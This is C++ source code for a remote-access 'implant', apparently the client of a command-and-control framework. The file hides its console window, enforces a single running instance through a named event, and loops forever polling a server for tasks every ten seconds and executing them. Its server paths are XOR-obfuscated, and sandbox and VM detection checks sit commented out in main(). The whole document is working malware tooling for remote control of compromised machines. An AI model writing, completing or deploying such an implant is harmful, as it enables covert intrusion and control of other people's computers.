#include "implant.h"

/* Loop that will run on repeat with a sleep timer*/

void IWillRunForever(void){
    while(true){

        /* THIS IS GETTING US COMMANDS EVERY MINUTE */
		std::string new_item = HttpGetCommand(xor_string(":rpaJvzxxt{qf",0x15), IMPLANT_ID);
        json converted_new_item = json::parse(new_item);
        int num_of_tasks = converted_new_item.size();

        for(int i = 0; i < num_of_tasks; i++){
            /* Only execute commands that are untouched */
            std::string line = converted_new_item.at(i).at(2);

			/* Parsing out commands and args */
			std::istringstream ss(line);
			std::string command;
			std::string args;
			ss >> command;
			ss >> args;
      
			/* Calling Execute - Sending Command, Args, Task_ID, Implant_ID */
            execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
        }

		/* Shortened Sleep to be able to test more efficiently */
        Sleep(10000);  
        //Sleep(60000);
    }
}

void registerimplant(void){

	/* This has yet to be Tested - Currently receives a 500 error */
    std::string jitter = std::to_string(5);
    std::string sleep = std::to_string(60000);
    HttpRegisterImplant(xor_string(":gpr|fapgJ|xeyt{a",0x15), jitter, sleep);
    return;
}

/*check if execution runs twice*/
BOOL CheckInstance(){
    HANDLE  m_hStartEvent = CreateEventA( NULL, FALSE, FALSE,xor_string("RTWWTRZZY",0x15).c_str());
    if(m_hStartEvent == NULL) {
        CloseHandle( m_hStartEvent ); 
        return false;
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle( m_hStartEvent ); 
        m_hStartEvent = NULL;
        return false;
    }
    return true;
}

int main(int argc, char* argv[]){
    FreeConsole();
    /* Registering Implant */
    //registerimplant();

    /* Sandbox Detection */
     //printf("Executing Sandbox Detection\n");
     //if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
       // 
    //  exit(0);
    

    //char * GlobalKey = newsymkey();
    //printf("NOTHING SUSPICIOUS HERE\n");
    


    /* Receive Tasks, Execute Tasks, Send Back Tasks */
    if (!CheckInstance()){
        //printf("ALREADY RUN\n");
        return -1;
    }
    
    IWillRunForever();
    return 0;
}